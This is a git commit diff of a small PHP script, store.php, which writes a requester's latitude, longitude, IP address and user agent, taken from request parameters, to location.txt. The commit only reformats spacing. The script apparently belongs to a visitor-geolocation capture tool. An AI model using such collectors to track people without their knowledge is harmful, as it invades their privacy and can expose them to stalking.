0fdb58386dc97add3d63480ca675c8f38070ebbb
SharonK-lab <sharonkaaya16@gmail.com>
2025-08-26 15:42:58 +0300

    Update store.php

--- store.php
+++ store.php
@@ -1,10 +1,11 @@
 <?php>
 $myfile = fopen("location.txt", "w");
-$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " .$_SERVER["REMOTE_ADDR"] . "\nUser agent :" .$_GET["uagent"];
+$txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUser agent :" . $_GET["uagent"];
 fwrite($myfile, $txt);
 fclose($myfile);
 
 ?>
+
 
 
 
